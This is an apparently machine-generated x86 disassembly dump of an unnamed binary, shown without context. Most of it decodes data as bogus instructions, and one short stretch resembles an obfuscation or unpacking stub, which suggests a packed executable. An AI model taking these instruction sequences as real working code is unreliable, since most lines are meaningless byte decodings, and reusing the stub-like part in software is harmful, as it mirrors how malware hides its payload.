  409b0f:	jno    0x409ac4
  409b11:	out    0xd8,al
  409b13:	jecxz  0x409b17
  409b15:	pop    ds
  409b16:	and    eax,0xbb11d54f
  409b1b:	push   0xf
  409b1d:	ror    DWORD PTR [edx+ebp*4],1
  409b20:	add    ah,BYTE PTR [edi+edi*8+0x9]
  409b24:	mov    ecx,0x93c6597b
  409b29:	fdivr  st(0),st
  409b2b:	scas   eax,DWORD PTR es:[edi]
  409b2c:	outs   dx,DWORD PTR ds:[esi]
  409b2d:	mov    al,BYTE PTR ss:[ecx+0x64f55e6f]
  409b34:	scas   al,BYTE PTR es:[edi]
  409b35:	jl     0x409af2
  409b37:	sti    
  409b38:	xchg   ecx,eax
  409b39:	imul   DWORD PTR [ecx+0x314259c7]
  409b3f:	jp     0x409b2e
  409b41:	cmp    dl,bh
  409b43:	add    al,0xc7
  409b45:	(bad)  
  409b46:	mov    cl,0xd9
  409b48:	in     eax,dx
  409b49:	lods   eax,DWORD PTR ds:[esi]
  409b4a:	imul   esi,DWORD PTR [ecx+0x3c],0xffffffaf
  409b4e:	mov    ebx,0xc94e6351
  409b53:	fcmovu st,st(1)
  409b55:	sbb    DWORD PTR [eax-0x3f],esi
  409b58:	xor    cl,BYTE PTR ds:0xe465f4ad
  409b5e:	dec    esi
  409b5f:	cld    
  409b60:	jbe    0x409b87
  409b62:	call   0xf12754ff
  409b67:	mov    al,ds:0x89d80b0c
  409b6c:	inc    ebp
  409b6d:	shr    BYTE PTR [ecx],0x15
  409b70:	add    DWORD PTR [esi+0x43],0x0
  409b74:	mov    eax,0x7510851
  409b79:	mov    edi,DWORD PTR ds:0x4345df
  409b7f:	or     DWORD PTR ds:0x43464f,edi
  409b85:	xor    edx,eax
  409b87:	xor    ecx,ecx
  409b89:	add    ecx,DWORD PTR ds:0x43467f
  409b8f:	xor    DWORD PTR ds:0x434683,ecx
  409b95:	mov    ecx,0x327299
  409b9a:	add    edx,ecx
  409b9c:	mov    DWORD PTR [ebp-0x8],edx
  409b9f:	inc    edi
  409ba0:	mov    edx,DWORD PTR [ebp+0x8]
  409ba3:	xor    edx,eax
  409ba5:	add    edx,ecx
  409ba7:	mov    DWORD PTR [ebp+0xc],edx
  409baa:	mov    DWORD PTR [ebp-0x4],0xf89c85d6
  409bb1:	mov    edx,DWORD PTR ds:0x43466b
  409bb7:	mov    edi,DWORD PTR ds:0x434723
  409bbd:	sub    edx,edi
  409bbf:	add    edx,DWORD PTR [edx+edi*1]
  409bc2:	jmp    0x409fd9
  409bc7:	xor    BYTE PTR [esp+edi*4],bl
  409bca:	xchg   ebp,eax
  409bcb:	mov    esp,0xd4bd31b5
  409bd0:	stos   BYTE PTR es:[edi],al
  409bd1:	cs pusha 
  409bd3:	xchg   DWORD PTR ds:0xea8e5587,ebx
  409bd9:	jle    0x409c59
  409bdb:	jo     0x409c56
  409bdd:	jle    0x409c5d
  409bdf:	nop
  409be0:	inc    ecx
  409be1:	test   eax,0xb979e738
  409be6:	in     al,dx
  409be7:	test   ch,dl
  409be9:	ficomp DWORD PTR [eax]
  409beb:	dec    edx
  409bec:	cmp    ah,BYTE PTR [ebp-0x401eb810]
  409bf2:	das    
  409bf3:	mov    al,0x17
  409bf5:	push   ds
  409bf6:	std    
  409bf7:	and    BYTE PTR [esi-0x1b],cl
  409bfa:	out    dx,al
  409bfb:	dec    edx
  409bfc:	cmp    al,0x39
  409bfe:	addr16 and di,sp
  409c02:	call   0x7e2d2f89
  409c07:	fnsetpm(287 only) 
  409c09:	xchg   ecx,eax
  409c0a:	inc    edi
  409c0b:	cli    
  409c0c:	push   0xffffff84
  409c0e:	stos   DWORD PTR es:[edi],eax
  409c0f:	dec    eax
  409c10:	cmp    eax,0xb2aaa1d3
  409c15:	les    ecx,FWORD PTR [esi]
  409c17:	adc    eax,ecx
  409c19:	loope  0x409c92
  409c1b:	inc    eax
  409c1c:	lds    ebp,FWORD PTR [ebx-0x5a21b464]
  409c22:	mov    al,ds:0x5beade7e
  409c27:	pusha  
  409c28:	or     eax,0xa2ca1fc4
  409c2d:	sbb    al,0x4e
  409c2f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409c30:	add    al,BYTE PTR [esi+0x736293b]
  409c36:	loope  0x409c55
  409c38:	pop    ebx
  409c39:	int3   
  409c3a:	xchg   edi,esp
  409c3c:	or     al,0xf
  409c3e:	mov    eax,ds:0x9e43819b
  409c43:	mov    ch,0x7e
  409c45:	sub    edx,DWORD PTR [esp+ecx*1-0x6bad69]
  409c4c:	fisttp WORD PTR [ebx+0x5c60a5a0]
  409c52:	ins    DWORD PTR es:[edi],dx
  409c53:	sub    dh,BYTE PTR [eax-0x16]
  409c56:	shr    bl,1
  409c58:	fidiv  WORD PTR [edi]
  409c5a:	je     0x409c1d
  409c5c:	mov    cl,dl
  409c5e:	cwde   
  409c5f:	iret   
  409c60:	fadd   QWORD PTR [ecx+0x356ca0e2]
  409c66:	xchg   DWORD PTR [ebx+0x72],ecx
  409c69:	in     eax,0x26
  409c6b:	je     0x409cc4
  409c6d:	adc    BYTE PTR [eax],bl
  409c6f:	xlat   BYTE PTR ds:[ebx]
  409c70:	fdiv   QWORD PTR [edi+0x61fda960]
  409c76:	jecxz  0x409c7d
  409c78:	call   FWORD PTR [ebp+0x5c]
  409c7b:	sar    DWORD PTR [edi],0xa2
  409c7e:	(bad)  
  409c7f:	xor    BYTE PTR [eax-0x7f471eaf],0x9f
  409c86:	(bad)  
  409c87:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409c88:	xor    BYTE PTR [ecx-0x80],0x6f
  409c8c:	rol    BYTE PTR [eax-0x7b],1
  409c8f:	repnz and eax,0x4a8884c5
  409c95:	dec    esp
  409c96:	iret   
  409c97:	jmp    0xb259e70f
  409c9c:	adc    BYTE PTR [edx+eax*8+0x4486be1b],0x28
  409ca4:	lods   eax,DWORD PTR ds:[esi]
  409ca5:	mov    esp,0x7ce38592
  409caa:	fs pop esi
  409cac:	jb     0x409c56
  409cae:	cld    
  409caf:	xchg   ebp,eax
  409cb0:	stc    
  409cb1:	enter  0x3d4b,0x1b
  409cb5:	mov    ch,0xa0
  409cb7:	sub    esi,edx
  409cb9:	push   ss
  409cba:	aaa    
  409cbb:	mov    ch,0xca
  409cbd:	or     esp,DWORD PTR [eax+0x26f78a94]
  409cc3:	into   
  409cc4:	push   0x5741cb82
  409cc9:	push   0x16
  409ccb:	popf   
  409ccc:	pop    edx
  409ccd:	push   es
  409cce:	aam    0x89
  409cd0:	call   0xfca9e7a2
  409cd5:	xchg   DWORD PTR [ebx],esp
  409cd7:	rol    ebx,cl
  409cd9:	push   ss
  409cda:	xchg   esp,eax
  409cdb:	sub    BYTE PTR [edx],0xcd
  409cde:	push   0x3d
  409ce0:	xchg   ebp,esp
  409ce2:	call   DWORD PTR [edx]
  409ce4:	jns    0x409c89
  409ce6:	cmc    
  409ce7:	in     eax,0x6f
  409ce9:	stos   BYTE PTR es:[edi],al
  409cea:	gs pop es
  409cec:	fstp   TBYTE PTR [ecx+0x47b15346]
  409cf2:	xchg   esp,eax
  409cf3:	cmp    BYTE PTR [ecx+0x7b],bh
  409cf6:	jne    0x409cd5
  409cf8:	mov    edi,DWORD PTR [edi]
  409cfa:	dec    ebx
  409cfb:	xor    DWORD PTR [esi],0xa411e90e
  409d01:	mov    ecx,0x772d31b9
  409d06:	jp     0x409d07
  409d08:	repnz mov esi,0x94c5914b
  409d0e:	mov    ch,BYTE PTR [eax-0x7ea6d334]
  409d14:	jge    0x409d08
  409d16:	and    eax,0x8deb38f0
  409d1b:	cmc    
  409d1c:	mov    eax,0x20778b8a
  409d21:	xlat   BYTE PTR ds:[ebx]
  409d22:	nop
  409d23:	sub    bl,dh
  409d25:	scas   al,BYTE PTR es:[edi]
  409d26:	inc    edx
  409d27:	xor    BYTE PTR [ebx+eiz*1-0x6a],dl
  409d2b:	jge    0x409cb5
  409d2d:	mov    eax,ds:0x311a7447
  409d32:	das    
  409d33:	pop    ds
  409d34:	pop    es
  409d35:	xchg   ebx,eax
  409d36:	adc    al,BYTE PTR [ebx]
  409d38:	pop    eax
  409d39:	xor    DWORD PTR [esi+0x49],esp
  409d3c:	call   0x27ce92b7
  409d41:	adc    BYTE PTR [esi-0x781f14f1],ah
  409d47:	lds    esi,FWORD PTR [ecx-0x17296e38]
  409d4d:	mov    esi,0x5a803d3
  409d52:	xor    DWORD PTR [edx],ebp
  409d54:	aad    0xe1
  409d56:	out    0x20,eax
  409d58:	(bad)  
  409d59:	dec    edi
  409d5a:	loopne 0x409d84
  409d5c:	int    0x9e
  409d5e:	push   ds
  409d5f:	ins    BYTE PTR es:[edi],dx
  409d60:	mov    al,0xec
  409d62:	mov    DWORD PTR [edi+0x63aac641],esi
  409d68:	dec    edx
  409d69:	cmp    al,0xd9
  409d6b:	sub    BYTE PTR [eax+0x60],dh
  409d6e:	mov    dl,0x42
  409d70:	int3   
  409d71:	sub    esp,DWORD PTR [esi-0x1c8a7643]
  409d77:	pop    eax
  409d78:	xchg   edi,eax
  409d79:	arpl   WORD PTR [ebx-0xe],di
  409d7c:	xor    DWORD PTR ds:0xfceaae23,edi
  409d82:	mov    bl,0x83
  409d84:	in     eax,0x54
  409d86:	ds stos DWORD PTR es:[edi],eax
  409d88:	stc    
  409d89:	mov    ch,0x8f
  409d8b:	jl     0x409ddf
  409d8d:	pop    ecx
  409d8e:	inc    ebp
  409d8f:	mov    cl,0xa
  409d91:	sbb    BYTE PTR [ecx],bh
  409d93:	scas   eax,DWORD PTR es:[edi]
  409d94:	mov    dl,0xaa
  409d96:	xor    ah,al
  409d98:	popa   
  409d99:	jmp    0x874ea18f
  409d9e:	mov    ds:0x8de34eb7,al
  409da3:	shr    ch,0x69
  409da6:	mov    ds:0x5a4c9d4,eax
  409dab:	xor    al,0x35
  409dad:	pusha  
  409dae:	xor    cl,dl
  409db0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409db1:	inc    esp
  409db2:	stos   DWORD PTR es:[edi],eax
  409db3:	and    eax,0x7dc182f4
  409db8:	inc    edi
  409db9:	sti    
  409dba:	dec    esi
  409dbb:	enter  0x78cf,0x7f
  409dbf:	push   0x8825f6ae
  409dc4:	ja     0x409d97
  409dc6:	mov    dh,0x93
  409dc8:	mov    DWORD PTR [ebx+edi*2-0x6c6b3202],ecx
  409dcf:	pop    ss
  409dd0:	mov    ebx,0x1879302
  409dd5:	in     al,0x8e
  409dd7:	cmp    eax,DWORD PTR [eax-0x4d]
  409dda:	xchg   esi,eax
  409ddb:	int3   
  409ddc:	xchg   edx,eax
  409ddd:	jae    0x409e1d
  409ddf:	inc    edi
  409de0:	aaa    
  409de1:	repnz xchg edx,eax
  409de3:	cmp    DWORD PTR [ebx-0xb],0xfd90f2fc
  409dea:	jae    0x409d89
  409dec:	jecxz  0x409e31
  409dee:	mov    eax,0x1fb4345d
  409df3:	sub    bl,cl
  409df5:	add    edi,edi
  409df7:	add    edx,DWORD PTR [ebp+0x76]
  409dfa:	cli    
  409dfb:	fxch   st(2)
  409dfd:	addr16 in al,dx
  409dff:	repnz test BYTE PTR fs:[eax-0x72],cl
  409e04:	cli    
  409e05:	dec    edi
  409e06:	jecxz  0x409e15
  409e08:	dec    edi
  409e09:	pop    es
  409e0a:	aad    0x77
  409e0c:	je     0x409d91
  409e0e:	loope  0x409e81
  409e10:	inc    edi
  409e11:	mov    bl,BYTE PTR [edx-0x58]
  409e14:	rcr    DWORD PTR [eax-0x3cf105f4],1
  409e1a:	xchg   esi,eax
  409e1b:	lock mov edx,0x7a44520b
  409e21:	adc    DWORD PTR [esi+0x5386127c],esi
  409e27:	push   edi
  409e28:	xchg   ebp,eax
  409e29:	xchg   edx,eax
  409e2a:	(bad)  
  409e2b:	outs   dx,DWORD PTR ds:[esi]
  409e2c:	or     ebp,DWORD PTR [ebp+esi*4+0x6f]
  409e30:	sbb    eax,0x296fee8
  409e35:	shl    DWORD PTR [edi-0x7c6e59df],1
  409e3b:	in     eax,0x64
  409e3d:	adc    DWORD PTR [esi-0x10],0x3e278f43
  409e44:	sbb    BYTE PTR [eax-0x1d2f4d30],ah
  409e4a:	cdq    
  409e4b:	stc    
  409e4c:	xchg   ecx,eax
  409e4d:	push   edi
  409e4e:	pop    ds
  409e4f:	add    bl,BYTE PTR [edi-0x1f44b1c6]
  409e55:	jmp    0x1f2e:0xcf547b34
  409e5c:	mov    al,ds:0x72be2a0
  409e61:	shl    DWORD PTR [esi],cl
  409e63:	cwde   
  409e64:	and    eax,0xc2ca55d1
  409e69:	daa    
  409e6a:	stc    
  409e6b:	cmp    ch,BYTE PTR [ebx-0x6dd83a52]
  409e71:	sbb    BYTE PTR [ebp-0x6184de3],dl
  409e77:	fist   DWORD PTR [esp+ebx*4+0x1978cb0b]
  409e7e:	stos   BYTE PTR es:[edi],al
  409e7f:	test   DWORD PTR [eax],ebx
  409e81:	nop
  409e82:	es dec esp
  409e84:	imul   edx,ebp,0x23
  409e87:	inc    edi
  409e88:	jae    0x409e37
  409e8a:	repnz mov esp,0x7b96b208
  409e90:	mov    cl,cl
  409e92:	pop    ebx
  409e93:	cli    
  409e94:	jb     0x409e16
  409e96:	in     eax,0xf9
  409e98:	aad    0xdb
  409e9a:	popf   
  409e9b:	sub    eax,0x88d74260
  409ea0:	repz mov dl,BYTE PTR [ebp-0x2f0dbdd6]
  409ea7:	bound  edx,QWORD PTR [edx]
  409ea9:	arpl   WORD PTR [esi+0x16e3f717],ax
  409eaf:	inc    esp
  409eb0:	mov    ebp,0x713222cf
  409eb5:	das    
  409eb6:	fs mov ecx,ebp
  409eb9:	jle    0x409ea6
  409ebb:	xchg   ebp,eax
  409ebc:	fldenv [eax]
  409ebe:	fwait
  409ebf:	out    dx,al
  409ec0:	inc    DWORD PTR [eax+edx*4]
  409ec3:	sub    BYTE PTR [edi+0x45],bh
  409ec6:	loope  0x409e8b
  409ec8:	out    0xe8,eax
  409eca:	(bad)  
  409ecb:	push   0x8ed6936a
  409ed0:	pop    ebx
  409ed1:	pop    ebp
  409ed2:	mov    eax,0x1117b435
  409ed7:	not    BYTE PTR [eax]
  409ed9:	adc    eax,0x8f8f43e9
  409ede:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409edf:	mov    ds:0xf60437ce,al
  409ee4:	out    0x98,eax
  409ee6:	mov    BYTE PTR [edi],dl
  409ee8:	stos   BYTE PTR es:[edi],al
  409ee9:	loop   0x409ec5
  409eeb:	mov    ebx,0x7382ceaa
  409ef0:	or     ecx,DWORD PTR [edx+ebp*1+0x2b]
  409ef4:	push   esi
  409ef5:	shr    DWORD PTR [esi+0xfce8a86],1
  409efb:	(bad)  
  409efc:	idiv   BYTE PTR [ebx+0x69]
  409eff:	sbb    BYTE PTR [ebx],ch
  409f01:	retf   0x9389
  409f04:	mov    ecx,0x6230d4a4
  409f09:	and    ecx,DWORD PTR ds:0x559e7959
  409f0f:	mov    edi,0x1df0f5d1
  409f14:	das    
  409f15:	xchg   BYTE PTR [ebp-0x7e0bd5fe],cl
  409f1b:	sbb    edi,esi
  409f1d:	cmp    bl,BYTE PTR ds:0xde4d9140
  409f23:	ss dec ebp
  409f25:	add    eax,0xb1e52e4e
  409f2a:	xchg   edi,eax
  409f2b:	imul   BYTE PTR [edi-0x5f06ced2]
  409f31:	pop    edi
  409f32:	iret   
  409f33:	mov    dh,0xe9
  409f35:	and    dl,al
  409f37:	sub    al,BYTE PTR [esi+0x69]
  409f3a:	adc    BYTE PTR [bx+si],ah
  409f3d:	xchg   ebp,eax
  409f3e:	xchg   BYTE PTR [edx+0x6a],al
  409f41:	ja     0x409ec7
  409f43:	jmp    0x409efe
  409f45:	ror    DWORD PTR [edi+0x4db05fe1],cl
  409f4b:	jle    0x409f7f
  409f4d:	xor    al,ah
  409f4f:	pop    ebx
  409f50:	fcom   QWORD PTR [ebp-0x79]
  409f53:	or     BYTE PTR [esi+esi*8],ch
  409f56:	or     cl,BYTE PTR [ecx]
  409f58:	les    esp,FWORD PTR [esi]
  409f5a:	or     DWORD PTR [esi-0x77],eax
  409f5d:	mov    dh,0xe3
  409f5f:	sbb    ebx,DWORD PTR [edi+0x7fe23a5b]
  409f65:	mov    cl,0xab
  409f67:	es pop es
  409f69:	pop    eax
  409f6a:	cmp    eax,DWORD PTR [ebp+0x49]
  409f6d:	inc    esi
  409f6e:	add    DWORD PTR [edi-0x2f],eax
  409f71:	cld    
  409f72:	test   al,0x25
  409f75:	fcomp  QWORD PTR [eax+0x2d]
  409f78:	cmp    al,0xeb
  409f7a:	lods   al,BYTE PTR ds:[esi]
  409f7b:	jae    0x409fb3
  409f7d:	dec    edx
  409f7e:	pusha  
  409f7f:	out    0xd9,eax
  409f81:	mov    edi,0x3eb4cd8
  409f86:	xchg   ebp,eax
  409f87:	js     0x409fa7
  409f89:	popa   
  409f8a:	shr    DWORD PTR [esi+0x66],0x3
  409f8e:	scas   al,BYTE PTR es:[edi]
  409f8f:	xor    al,0x4e
  409f91:	rcr    DWORD PTR [edx+0x6a65dadc],1
  409f97:	adc    BYTE PTR [edx],0x2d
  409f9a:	pop    ds
  409f9b:	pop    edx
  409f9c:	dec    esi
  409f9d:	xchg   ecx,eax
  409f9e:	sub    bl,BYTE PTR [ebx]
  409fa0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409fa1:	mov    ?,WORD PTR [ebx]
  409fa3:	xchg   edx,eax
  409fa4:	hlt    
  409fa5:	mov    ebx,0x8a62ff2b
  409faa:	xor    ch,BYTE PTR [ecx-0x5c]
  409fad:	pop    ebp
  409fae:	jae    0x40a02c
  409fb0:	push   0x1a71aa6f
  409fb5:	add    ah,dh
  409fb7:	das    
  409fb8:	test   eax,0x2dc1c8dc
  409fbd:	shr    BYTE PTR [ebp+0x1e],1
  409fc0:	add    eax,ecx
  409fc2:	setl   BYTE PTR [ebx-0x545b846c]
  409fc9:	xchg   edx,eax
  409fca:	bound  ecx,QWORD PTR [ebx+0x4b204b42]
  409fd0:	pushf  
  409fd1:	dec    esp
  409fd2:	test   eax,edx
  409fd4:	popf   
  409fd5:	(bad)  
  409fd6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409fd7:	push   esp
  409fd8:	mov    es,edi
  409fda:	inc    ebp
  409fdb:	fdivr  DWORD PTR [eax]
  409fdd:	test   DWORD PTR [eax+edi*8+0x12e9ff23],ebx
  409fe4:	add    al,0x0
  409fe6:	add    BYTE PTR [ecx+0x6b],ah
  409fe9:	in     al,dx
  409fea:	(bad)  
  409feb:	cld    
  409fec:	popf   
  409fed:	popa   
  409fee:	imul   ebp,DWORD PTR [esi],0x0
  409ff1:	push   ebx
  409ff2:	fchs   
  409ff4:	scas   al,BYTE PTR es:[edi]
  409ff5:	(bad)  
  409ff6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409ff7:	xor    dh,0x7e
  409ffa:	jle    0x40a06c
  409ffc:	jns    0x40a07c
  409ffe:	jle    0x409faa
  40a000:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a001:	dec    esi
  40a002:	fiadd  DWORD PTR [ebx+0x11]
  40a005:	test   edx,0xb7c94f53
  40a00b:	sar    dl,1
  40a00d:	mov    BYTE PTR [esi+0x79],bh
  40a010:	shl    DWORD PTR [edx],1
  40a012:	paddsw mm5,QWORD PTR [ebx+0x29289fa9]
  40a019:	sbb    BYTE PTR [edx+0x56695939],ch
  40a01f:	xor    cl,BYTE PTR ds:0x1e43a555
  40a025:	sub    BYTE PTR [esi-0x12],cl
  40a028:	push   es
  40a029:	dec    ebx
  40a02a:	aad    0x95
  40a02c:	adc    BYTE PTR [edi+edx*2-0x1b],dh
  40a030:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a032:	push   edi
  40a033:	mov    ds:0x2d8b0502,eax
  40a038:	ror    BYTE PTR [ecx-0x60],1
  40a03b:	and    BYTE PTR [edi-0x44],0xb3
  40a03f:	in     eax,dx
  40a040:	ss ja  0x40a00b
  40a043:	enter  0xa326,0x89
  40a047:	(bad)  
  40a048:	pop    ecx
  40a049:	adc    BYTE PTR [edi-0x3],bl
  40a04c:	cld    
  40a04d:	or     edi,DWORD PTR [edx+ebx*4-0xe]
  40a051:	(bad)  
  40a052:	mov    ds:0xf0b4e57c,al
  40a057:	nop
  40a058:	dec    ebp
  40a059:	mov    dl,0xa4
  40a05b:	or     DWORD PTR [eax],ebx
  40a05d:	cld    
  40a05e:	sbb    BYTE PTR [edi+0x7a],bl
  40a061:	mov    edx,0x42a54c2c
  40a066:	or     ebp,ebx
  40a068:	lods   al,BYTE PTR ds:[esi]
  40a069:	jb     0x40a070
  40a06b:	push   ecx
  40a06c:	call   0xa390:0x9f9aced0
  40a073:	hlt    
  40a074:	ret    0x9b19
  40a077:	jb     0x40a0be
  40a079:	icebp  
  40a07a:	in     eax,0xf9
  40a07c:	and    ch,BYTE PTR [edi-0x1b]
  40a07f:	loop   0x40a0d4
  40a081:	jmp    0xd979:0xacd42633
  40a088:	cmp    BYTE PTR [edi-0x19],ah
  40a08b:	addr16 mov edx,0xb5c42985
  40a091:	push   eax
  40a092:	push   0xbcf98839
  40a097:	jae    0x40a058
  40a099:	add    al,0xfc
  40a09b:	mov    edx,0x8295c4b6
  40a0a0:	out    0xe3,al
  40a0a2:	inc    edi
  40a0a3:	adc    BYTE PTR [ebx],bh
  40a0a5:	retf   0x18d5
  40a0a8:	dec    esp
  40a0a9:	jmp    0x40a100
  40a0ab:	hlt    
  40a0ac:	(bad)  
  40a0ae:	inc    esp
  40a0af:	and    bl,cl
  40a0b1:	bnd js 0x40a078
  40a0b4:	(bad)  
  40a0b5:	pushf  
  40a0b6:	jbe    0x40a09b
  40a0b8:	aas    
  40a0b9:	imul   esp,DWORD PTR [esi],0x21
  40a0bc:	(bad)  
  40a0bd:	and    al,0x96
  40a0bf:	inc    esp
  40a0c0:	xchg   edx,eax
  40a0c1:	mov    eax,0xc1f29df3
  40a0c6:	xchg   DWORD PTR [edx+0x34],esp
  40a0c9:	aaa    
  40a0ca:	daa    
  40a0cb:	repnz pop ecx
  40a0cd:	aaa    
  40a0ce:	mov    eax,ds:0x487bc2b3
  40a0d3:	dec    esi
  40a0d4:	stos   DWORD PTR es:[edi],eax
  40a0d5:	mov    eax,ds:0x24351c06
  40a0da:	fldlg2 
  40a0dc:	inc    ebp
  40a0dd:	aam    0x88
  40a0df:	call   DWORD PTR [ebx-0x7a1b0439]
  40a0e5:	jecxz  0x40a0b8
  40a0e7:	xor    cl,BYTE PTR [ebx+ebx*8-0x4b]
  40a0eb:	ja     0x40a132
  40a0ed:	pop    ebx
  40a0ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a0ef:	scas   eax,DWORD PTR es:[edi]
  40a0f0:	sub    BYTE PTR [edx+edx*2+0x37],bh
  40a0f4:	adc    DWORD PTR [esi-0x68],esi
  40a0f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a0f8:	push   es
  40a0f9:	pop    esi
  40a0fa:	mov    ds:0x98ec566e,al
  40a0ff:	arpl   WORD PTR [eax-0x294c471e],dx
  40a105:	fist   DWORD PTR [ecx-0x6223be2c]
  40a10b:	in     al,dx
  40a10c:	neg    esi
  40a10e:	lods   al,BYTE PTR ds:[esi]
  40a10f:	jge    0x40a0d6
  40a111:	cwde   
  40a112:	aaa    
  40a113:	sub    ah,BYTE PTR [ebx+0x4a]
  40a116:	mov    ebx,0x254af40
  40a11b:	inc    ebp
  40a11c:	push   ebx
  40a11d:	jl     0x40a145
  40a11f:	loopne 0x40a182
  40a121:	out    dx,eax
  40a122:	xor    eax,0x3b52166f
  40a127:	pop    sp
  40a129:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a12a:	jo     0x40a124
  40a12c:	idiv   DWORD PTR [ecx+0x24751e67]
  40a132:	xchg   edi,eax
  40a133:	and    BYTE PTR [ebx+0x3c],dl
  40a136:	mov    ecx,0x35762310
  40a13b:	cdq    
  40a13c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a13d:	push   cs
  40a13e:	or     eax,0x1fc81181
  40a143:	add    BYTE PTR [eax+0x18463bd],al
  40a149:	push   cs
  40a14a:	js     0x40a1ab
  40a14c:	cmp    eax,0x749ecf8e
  40a151:	or     BYTE PTR [esi+edi*2],0xed
  40a155:	and    eax,0x8cdbbb48
  40a15a:	shr    BYTE PTR [ebx-0xdedb3de],cl
  40a160:	add    dl,ch
  40a162:	sub    bl,ah
  40a164:	fisttp WORD PTR ds:0xbddedf91
  40a16a:	inc    edi
  40a16b:	outs   dx,DWORD PTR ds:[esi]
  40a16c:	loop   0x40a179
  40a16e:	lods   al,BYTE PTR ds:[esi]
  40a16f:	daa    
  40a170:	cdq    
  40a171:	imul   DWORD PTR [eax+0x202d97a8]
  40a177:	mov    DWORD PTR ds:0xe7a12d6c,eax
  40a17d:	sub    esi,esi
  40a17f:	xor    ah,bh
  40a181:	xlat   BYTE PTR ds:[ebx]
  40a182:	pop    ebx
  40a183:	xchg   DWORD PTR [eax+0x68],edi
  40a186:	icebp  
  40a187:	add    BYTE PTR [esi],al
  40a189:	ja     0x40a138
  40a18b:	xor    ch,BYTE PTR [esi]
  40a18d:	mov    WORD PTR [edx+0x51],fs
  40a190:	or     DWORD PTR [ebx-0x9],ecx
  40a193:	and    al,al
  40a195:	dec    edi
  40a196:	pop    ds
  40a197:	(bad)  
  40a198:	xchg   ecx,eax
  40a199:	int    0xdd
  40a19b:	jg     0x40a1a9
  40a19d:	cmp    esi,DWORD PTR [esi+ebp*4]
  40a1a0:	pop    ss
  40a1a1:	arpl   bp,cx
  40a1a3:	in     eax,dx
  40a1a4:	adc    DWORD PTR ds:0x21e7e8db,ecx
  40a1aa:	mov    ch,0x8f
  40a1ac:	push   cs
  40a1ad:	les    edx,FWORD PTR [ebx+0x59882466]
  40a1b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a1b4:	mov    ds:0x67e00c52,eax
  40a1b9:	dec    ecx
  40a1ba:	or     dh,BYTE PTR [esi+0x47]
  40a1bd:	jmp    0x5c0c:0x81633cc6
  40a1c4:	in     eax,dx
  40a1c5:	lahf   
  40a1c6:	cmp    DWORD PTR [edi+0x4382a6e9],0x714f98ae
  40a1d0:	ret    0x9282
  40a1d3:	es jg  0x40a251
  40a1d6:	and    BYTE PTR [ebp-0x4b],dh
  40a1d9:	cli    
  40a1da:	ror    edx,cl
  40a1dc:	fsub   DWORD PTR [ebp-0x1cfed5f3]
  40a1e2:	aad    0x7b
  40a1e4:	ss jb  0x40a24d
  40a1e7:	cdq    
  40a1e8:	xchg   DWORD PTR [edx+eiz*1-0x7a],esi
  40a1ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a1ed:	das    
  40a1ee:	imul   edx,DWORD PTR [edx+0x71],0x931105c1
  40a1f5:	icebp  
  40a1f6:	and    DWORD PTR [eax],eax
  40a1f8:	add    eax,0x5cbc633a
  40a1fd:	mov    esi,0xd3cd1546
  40a202:	pop    es
  40a203:	jl     0x40a22b
  40a205:	mov    dh,0x7f
  40a207:	test   BYTE PTR [ebx],dl
  40a209:	push   edx
  40a20a:	sub    ah,BYTE PTR [esi+0x6592c54e]
  40a210:	dec    esp
  40a211:	mov    DWORD PTR [edx-0x33dd5075],ecx
  40a217:	push   cs
  40a218:	push   ds
  40a219:	cmp    al,0x79
  40a21b:	sub    eax,0x94db015c
  40a220:	dec    esi
  40a221:	cmp    ecx,DWORD PTR [esi+ecx*8]
  40a224:	sub    BYTE PTR [eax-0x4f],dh
  40a227:	xchg   ecx,eax
  40a228:	inc    ebx
  40a229:	mov    si,0x732f
  40a22d:	jo     0x40a295
  40a22f:	dec    edi
  40a230:	pusha  
  40a231:	inc    ebx
  40a232:	into   
  40a233:	test   al,0xf5
  40a235:	push   ebx
  40a236:	sahf   
  40a237:	sahf   
  40a238:	test   al,0x6d
  40a23a:	jno    0x40a2a2
  40a23c:	xchg   esp,eax
  40a23d:	dec    ebp
  40a23e:	xchg   esp,eax
  40a23f:	in     al,0x78
  40a241:	cwde   
  40a242:	into   
  40a243:	adc    BYTE PTR [esi+edx*8+0x7f23aaa2],0xf4
  40a24b:	pop    ss
  40a24c:	cmp    al,0x2e
  40a24e:	xchg   BYTE PTR [ebp+0x17],dh
  40a251:	fcomp  DWORD PTR [edi]
  40a253:	cmp    DWORD PTR [ebx],0xffffff8c
  40a256:	jmp    0x40a215
  40a258:	push   edi
  40a259:	push   edi
  40a25a:	sbb    BYTE PTR [eax],bh
  40a25c:	aam    0xce
  40a25e:	arpl   WORD PTR [ebp-0x6c],bx
  40a261:	cmp    BYTE PTR [ebx+0x3ec8ade4],al
  40a267:	arpl   WORD PTR [esi-0x11],ax
  40a26a:	in     eax,0xa
  40a26c:	sbb    eax,DWORD PTR [ebx]
  40a26e:	jns    0x40a25c
  40a270:	test   eax,0x8ff6b97d
  40a275:	cmp    al,BYTE PTR [ebx+0x19]
  40a278:	xor    al,0xc
  40a27a:	fiadd  WORD PTR [eax]
  40a27c:	cld    
  40a27d:	in     al,dx
  40a27e:	call   0xe07c2072
  40a283:	jno    0x40a2aa
  40a285:	or     cl,cl
  40a287:	mov    cl,0x43
  40a289:	inc    eax
  40a28a:	pusha  
  40a28b:	std    
  40a28c:	push   esi
  40a28d:	push   0xffffffd6
  40a28f:	pop    ebx
  40a290:	pop    edx
  40a291:	mov    bh,bh
  40a293:	push   esp
  40a294:	pop    ds
  40a295:	call   0xfc:0xcd50768b
  40a29c:	cld    
  40a29d:	push   ebp
  40a29e:	call   0x5060:0x69a754a7
